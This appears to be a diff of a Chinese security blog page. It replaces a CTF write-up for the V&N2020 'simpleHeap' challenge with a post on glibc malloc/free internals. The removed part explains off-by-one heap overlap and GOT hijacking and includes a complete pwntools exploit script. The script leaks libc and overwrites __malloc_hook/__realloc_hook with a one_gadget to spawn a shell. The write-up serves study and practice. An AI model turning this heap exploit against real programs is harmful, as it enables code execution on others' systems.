@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [V&amp;N2020 公开赛]simpleHeap
+                                glibc源码学习
                             </h1>
                             
                                 <!--en-->
@@ -175,19 +175,17 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-08-17</a>
+                                Date: <a href="#">2020-09-06</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">8.4
+                                    href="#">2.6
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1939</a></span>
+                                    <span class="post-words">words:<a href="#">558</a></span>
                                     
                                         <span class="post-category">
                                 Category:
                                 
-                                <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">off-by-one</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/7Pk4hD0yHh/">fastbin attack</a>
+                                <a href="https://l3mon629.github.io/tag/_z_SEOkSG/">glibc</a>
                                 
                             </span>
                                         
@@ -199,201 +197,118 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>通过这个题目来学习 off-by-one</p>
-<h1 id="什么是off-by-onenull">什么是off by one(null) ?</h1>
-<p>定义我也不知道，直接说我的理解。就是那种在用户输入时，一个循环处理边界问题或者是数组越界，对我们的输入没有很好的处理，就会导致一个字节的溢出（或者是strcpy处理不当）。</p>
-<h2 id="利用off-by-one">利用off-by-one</h2>
-<p>有师傅喜欢叫off-by-one 为一个字节的偷渡攻击<br>
-给攻击者发挥的攻击空间也只有一个字节，所以利用方式还是有一定限制的<br>
-我们最常利用的（或许是）手法是 堆块重叠（chunk extend），跟我之前讲过的“堆块怀孕”本质是一个东西，chunk extend 的利用条件如下：<br>
-1，能够进行堆空间的布局（即写入之类的功能）<br>
-2，至少能够溢出一个字节<br>
-其中第二个条件正好符合off-by-one的情景</p>
-<h2 id="利用过程off-by-one-chunk-extend">利用过程：off-by-one + chunk extend</h2>
-<p>由于本人水平有限（wtcl orz<br>
-所以就举两个例子好了，一个是开启了Full RELRO，一个没开启</p>
-<h3 id="got表无防护的利用情景">got表无防护的利用情景</h3>
-<p>既然got表无防护，那么我们可以利用这一个字节的溢出来改写got表，看详细的c代码：</p>
-<pre><code class="language-c">#include &lt;stdio.h&gt;
+                            <p>主要探究一下malloc和free是如何执行的</p>
+<h2 id="malloc">malloc</h2>
+<p>真正发挥作用的是_int_malloc<br>
+<img src="https://l3mon629.github.io/post-images/1599382576086.png" alt="" loading="lazy"><br>
+但是call malloc是__libc_malloc<br>
+<img src="https://l3mon629.github.io/post-images/1599382656578.png" alt="" loading="lazy"><br>
+在__libc_malloc中会调用_int_malloc<br>
+<img src="https://l3mon629.github.io/post-images/1599382753548.png" alt="" loading="lazy"></p>
+<p>整个heap的信息都记录在struct malloc_state中，称为main_arena<br>
+<img src="https://l3mon629.github.io/post-images/1599389921436.png" alt="" loading="lazy"></p>
+<p>__libc_malloc主体部分如下<br>
+hook取得__malloc_hook部分内容<br>
+如果指针hook != 0 就调用hook函数<br>
+(第一次调用malloc时，__malloc_hook里面其实是有一个叫malloc_hook_ini的函数，该函数首先把__mallochook置0防止再次调用（因为返回地址是__libc_malloc，然后调用了ptmalloc_init()这个做初始化工作的主体函数)</p>
+<pre><code>void *
+__libc_malloc (size_t bytes)
+{
+  mstate ar_ptr;
+  void *victim;
+  void *(*hook) (size_t, const void *)
+    = atomic_forced_read (__malloc_hook);
+  if (__builtin_expect (hook != NULL, 0))
+    return (*hook)(bytes, RETURN_ADDRESS (0));
+
+  arena_get (ar_ptr, bytes);
+
+  victim = _int_malloc (ar_ptr, bytes);
+  /* Retry with another arena only if we were able to find a usable arena
+     before.  */
+  if (!victim &amp;&amp; ar_ptr != NULL)
+    {
+      LIBC_PROBE (memory_malloc_retry, 1, bytes);
+      ar_ptr = arena_get_retry (ar_ptr, bytes);
+      victim = _int_malloc (ar_ptr, bytes);
+    }
+  if (ar_ptr != NULL)
+    __libc_lock_unlock (ar_ptr-&gt;mutex);
+  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
+          ar_ptr == arena_for_chunk (mem2chunk (victim)));
+  return victim;
+}
+</code></pre>
+<p>点进去arena_get</p>
+<pre><code>/* arena_get() acquires an arena and locks the corresponding mutex.
+   First, try the one last locked successfully by this thread.  (This
+   is the common case and handled with a macro for speed.)  Then, loop
+   once over the circularly linked list of arenas.  If no arena is
+   readily available, create a new one.  In this latter case, `size'
+   is just a hint as to how much memory will be required immediately
+   in the new arena. */
+#define arena_get(ptr, size) do { \
+      ptr = thread_arena;                                                      \
+      arena_lock (ptr, size);                                                      \
+  } while (0)
+</code></pre>
+<p>我们直接上手跟踪好了</p>
+<pre><code class="language-c">#Include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
+int main()
+{
+    void *p,*q;
+    p = malloc(100);
+    q = malloc(16);
+    return 0;
+}
+</code></pre>
+<p>可以看到，第一次调用malloc时，会进去malloc_hook_ini函数<br>
+<img src="https://l3mon629.github.io/post-images/1599397122378.png" alt="" loading="lazy"><br>
+执行完后返回到__libc_malloc函数里面<br>
+<img src="https://l3mon629.github.io/post-images/1599397353864.png" alt="" loading="lazy"></p>
+<h2 id="free">free</h2>
+<p>我们通过这个demo看一下free过程中发生了啥</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;malloc.h&gt;
 
 int main()
 {
-	void *p,*q1,*r1,*q2,*r2,*got;
-	p = malloc(0x18);	//index 0
-	q1 = malloc(0x20);	//index 1
-	r1 = malloc(0x30);	//index 2
+        void *p,*q,*r;
+        p = malloc(150);
+        q = malloc(150);
+        r = malloc(150);
 
-	memset(p+0x18,0x71,0x1);
-
-	free(q1);
-	free(r1);
-	q2 = malloc(0x60);
-	memset(q2+0x30,'A',0x8);
-
-	r2 = malloc(0x30);
-	got = malloc(0x30);
-
-	return 0;
+        free(p);
+        free(r);
+        free(q);
 }
 </code></pre>
-<p>思路是申请三个chunk，大小分别为0x18,0x20,0x30<br>
-第一个chunk用来出发off-by-one 漏洞，第二个chunk用来构筑堆块重叠，第三个chunk用来构筑 fake chunk，我们利用第一个chunk溢出一字节来改写第二个chunk的size位，然后将第三个chunk来包含进去，然后free两次，在malloc一次，拿到big chunk的控制权，通过向big chunk里写入内容，改写free small chunk的fd pointer(此时smaller chunk还是free态)，接着malloc两次，我们就能够拿到一个fake chunk，如果fake chunk位于got表附近，那么我们便可以劫持got表项继而拿到shell<br>
-接下来我们看具体的调试过程。<br>
-malloc拿到三个堆块：<br>
-<img src="https://l3mon629.github.io/post-images/1597671064864.png" alt="" loading="lazy"><br>
-人为构造一个off-by-one来溢出一字节：<br>
-<img src="https://l3mon629.github.io/post-images/1597671637871.png" alt="" loading="lazy"><br>
-free两次，可以看到我们改写后的chunk已经变成了free态：<br>
-<img src="https://l3mon629.github.io/post-images/1597671670823.png" alt="" loading="lazy"><br>
-通过向big chunk里写内容可以改写fd pointer，可以看到2号chunk的pointer已经变成了‘AAAA’……<br>
-<img src="https://l3mon629.github.io/post-images/1597671710381.png" alt="" loading="lazy"><br>
-这个便是劫持got表的流程</p>
-<h3 id="got-表不可写">got 表不可写：</h3>
-<p>对于got表项不可写的elf，我们可以借鉴fastbin attack的思路来攻击__malloc_hook函数，将__malloc_hook函数改写成one_gadget，触发malloc拿shell<br>
-思路很简单，大体思路和上面一样，然后三号chunk的fd pointer可以写成__malloc_hook+23的位置（字节错位，具体原因不再赘述），然后将__malloc_hook改写即可，注意的是，为了达到fastbin attack的目的，我们3号块的mem大小必须是0x60，因为要把0x7f的fake chunk链接在同一个bin中</p>
-<h1 id="题目解析">题目解析：</h1>
-<h2 id="逆向过程">逆向过程：</h2>
-<p>代码量尚可，off-by-one的漏洞还是有一定隐秘性的，具体的逆向分析不再赘述<br>
-注意两个点即可：<br>
-第一，本程序不存在UAF漏洞，即delete函数中对free的chunk处理的很好，把free态的指针数据都给清空了<br>
-<img src="https://l3mon629.github.io/post-images/1597672411375.png" alt="" loading="lazy"><br>
-第二，就是off-by-one的产生的位置<br>
-<img src="https://l3mon629.github.io/post-images/1597672516927.png" alt="" loading="lazy"><br>
-可以看到，if判断语句是小于号，也就是说当变量等于size+1的时候依然可以可以读入数据，这就是典型的off-by-one漏洞</p>
-<h2 id="pwn-it">pwn it ！！！</h2>
-<h3 id="思路分析">思路分析</h3>
-<p>这个程序保护全开，所以我们不能攻击got表了，我们只能选择__malloc_hook函数，但是我们要想找到__malloc_hook函数，我们必须泄漏libc，但是程序只允许我们申请fastbin大小的chunk<br>
-这个题有一个很巧妙的泄漏libc的方法，就是将两个fastbin合并成一个unsortedbin，利用unsorted bin来泄漏main_arena + 88的位置，然后拿到libc基址。<br>
-具体思路是这样的，构造四个chunk：<br>
-chunk 0 : size 0x18<br>
-chunk 1 : size 0x50<br>
-chunk 2 : size 0x60<br>
-chunk 3 : size 0x10  （防止与top chunk合并）<br>
-我们通过off-by-one将1和2合并，free 1，这个时候1和2合并的chunk已经超过fastbin，进入unsorted bin，我们再malloc(0x50)，这个时候unsorted bin就会切割下来0x50，剩下2号chunk留在unsorted bin里面，但是！！我们从始至终都没有free chunk 2，2号指针的控制权仍然在我们手中，所以我们可以打印2号chunk的内容，为什么呢？因为2号chunk在unsorted bin里，其fd 和 bk都是有内容的！！他们都指向了main_arena + 88，通过这一点，我们就能泄漏出libc的基地址<br>
-我们拿到基址后，就得想办法fastbin attack，有一种办法就是我们上文说的方法，构造三个fastbin chunk，自然是可以的，但是如果题目限制我们malloc次数，我们还有办法吗？（这个题目虽然限制次数，但是依然申请三次依然在允许的范围之内）<br>
-答案是有的，我们可以malloc(0x60)，记成chunk 4，然后我们紧接着free 4，这么做的目的就是将这块chunk从unsorted bin中移动到 fastbin中，so 我们再次利用 allocated 态的2号pointer来edit，把fd位改成__malloc_hook - 0x23，然后one_gadget<br>
-但是这个题目在gadget的时候我们发现是有问题的，因为四个gadget的寄存器的条件我们均不满足，所以我们得借助__libc_realloc函数来调整寄存器的值，在__libc_realloc函数中会调用__realloc_hook函数，所以我们把one_gadget的位置打到__realloc_hook的位置，把__libc_realloc的地址打到__malloc_hook里面即可，令人兴奋的是，__realloc_hook的位置就在__malloc_hook的上方，这样我们的程序执行流程为，我们malloc---&gt;触发__malloc_hook---&gt;跳转到__libc_realloc调整寄存器---&gt;触发__realloc_hook---&gt;__realloc_hook是我们的one_gadget---&gt;get shell !!!<br>
-__malloc_hook = fake_chunk_mem - 0x13<br>
-__realloc_hook = fake_chunk_mem - 0x13 - 0x5</p>
-<h3 id="漏洞利用">漏洞利用</h3>
-<p>exp:（pwntools版本是python3的版本）</p>
-<pre><code class="language-python">from pwn import *
-
-local = 0
-
-if local == 1:
-	sh = process('./vn_pwn_simpleHeap')
-else:
-	sh = remote('node3.buuoj.cn',28903)
-
-libc = ELF('./libc-2.23.so')
-elf = ELF('./vn_pwn_simpleHeap')
-
-def add(size,content):
-	sh.recvuntil('choice: ')
-	sh.sendline('1')
-	sh.sendlineafter('size?',str(size))
-	sh.sendafter('content:',content)
-
-def edit(index,content):
-	sh.sendlineafter('choice: ','2')
-	sh.sendlineafter('idx?',str(index))
-	sh.sendafter('content',content)
-
-def show(index):
-	sh.sendlineafter('choice: ','3')
-	sh.sendlineafter('idx?',str(index))
-
-
-def delete(index):
-	sh.sendlineafter('choice: ','4')
-	sh.sendlineafter('idx?',index)
-
-print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;)
-
-add(0x18,b'A'*0x18)		#index 0    0x18 because we use the next chunk prevsize double using
-add(0x50,b'A')		#index 1
-add(0x60,b'A')		#index 2
-add(0x10,b'A')		#index 3         to protect
-
-edit(0,b'A' * 0x18 + b'\xd1')       # off by one to change the &quot;index 1&quot; chunk's size
-
-
-print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;)
-
-delete('1')
-add(0x50,'B')
-show(2)		#index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2
-
-main_arena_88 = u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
-main_arena = main_arena_88 - 88
-libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook']        #libc_base = __malloc_hook - __malloc_hook_offset
-print(hex(libc_base))
-
-
-print(&quot;================================ 3: fastbin attack ---&gt;  attack __malloc_hook-0x23  ================&quot;)
-
-malloc_hook = libc_base + libc.symbols['__malloc_hook']
-fake_chunk = malloc_hook - 0x23
-
-
-print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!')
-
-add(0x60,b'A' * 16)		#index 4
-delete('2')
-print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################')                
-
-print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;)
-edit(4,p64(fake_chunk)+b'\n')
-
-
-one_gadget = libc_base + 0x4526a		#one_gadget
-
-print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;)
-realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12
-realloc_hook_1 = libc_base + 0x846CC
-
-print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;)
-print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;)
-payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\n'
-
-add(0x60,'A')			#index 2   which fd pointer point   fake chunk
-add(0x60,payload)		#index fake chunk
-
-print(&quot;==============================  4: one_gadget ===========================&quot;)
-sh.sendline('1')
-sh.sendline('32')
-sh.interactive()
-</code></pre>
+<p>如图，我们现在申请了三个chunk<br>
+<img src="https://l3mon629.github.io/post-images/1599392604538.png" alt="" loading="lazy"><br>
+free掉一块，可以看到进入unsorted bin中去<br>
+<img src="https://l3mon629.github.io/post-images/1599392721640.png" alt="" loading="lazy"><br>
+把r free掉，可以看到直接和top chunk合并了<br>
+<img src="https://l3mon629.github.io/post-images/1599392817762.png" alt="" loading="lazy"></p>
+<p>思考：如果free q后，是q先和p合并呢还是先和topchunk合并呢？？<br>
+调试小技巧<br>
+<img src="https://l3mon629.github.io/post-images/1599393053236.png" alt="" loading="lazy"></p>
+<p>可以看到，其实是先和前一块chunk进行合并的<br>
+size加上prevsize之类的<br>
+<img src="https://l3mon629.github.io/post-images/1599393483591.png" alt="" loading="lazy"><br>
+小技巧，p *(struct malloc_state*)address可以将某个地址的堆块详细信息打印出来<br>
+可以看到，最终三个chunk都被top chunk合并起来<br>
+<img src="https://l3mon629.github.io/post-images/1599393880134.png" alt="" loading="lazy"></p>
 
                         </div>
                         
                             <div class="post-toc">
                                 <ul class="markdownIt-TOC">
-<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFoff-by-onenull">什么是off by one(null) ?</a>
+<li>
 <ul>
-<li><a href="#%E5%88%A9%E7%94%A8off-by-one">利用off-by-one</a></li>
-<li><a href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8Boff-by-one-chunk-extend">利用过程：off-by-one + chunk extend</a>
-<ul>
-<li><a href="#got%E8%A1%A8%E6%97%A0%E9%98%B2%E6%8A%A4%E7%9A%84%E5%88%A9%E7%94%A8%E6%83%85%E6%99%AF">got表无防护的利用情景</a></li>
-<li><a href="#got-%E8%A1%A8%E4%B8%8D%E5%8F%AF%E5%86%99">got 表不可写：</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90">题目解析：</a>
-<ul>
-<li><a href="#%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B">逆向过程：</a></li>
-<li><a href="#pwn-it">pwn it ！！！</a>
-<ul>
-<li><a href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90">思路分析</a></li>
-<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
-</ul>
-</li>
+<li><a href="#malloc">malloc</a></li>
+<li><a href="#free">free</a></li>
 </ul>
 </li>
 </ul>
@@ -411,7 +326,7 @@ sh.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/">https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/">https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -426,9 +341,9 @@ sh.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/&sharesource=qzone&title=[V&amp;N2020 公开赛]simpleHeap&pics=https://l3mon629.github.io/images/avatar.png?v=1599401136863&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/&sharesource=weibo&title=[V&amp;N2020 公开赛]simpleHeap + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599401136863 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/&sharesource=qzone&title=glibc源码学习&pics=https://l3mon629.github.io/images/avatar.png?v=1599401136863&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/&sharesource=weibo&title=glibc源码学习 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599401136863 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -438,12 +353,8 @@ sh.interactive()
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://l3mon629.github.io/tag/Q22QNSAxW/">#
-                                                off-by-one
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/7Pk4hD0yHh/">#
-                                                fastbin attack
+                        <a href="https://l3mon629.github.io/tag/_z_SEOkSG/">#
+                                                glibc
                                                     </a>
                                                     
                                                         
@@ -459,11 +370,11 @@ sh.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/">
-                                                                                            [V&amp;N2020 公开赛]easyTHeap
-                                                                                        </a>
-                                                                                        
                                                                                             
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/">
+                                                                                                    ctfwiki-unlink—2014 HITCON stkof
+                                                                                                </a>
+                                                                                                
                                                                                 </section>
                     </article>
                 </div>
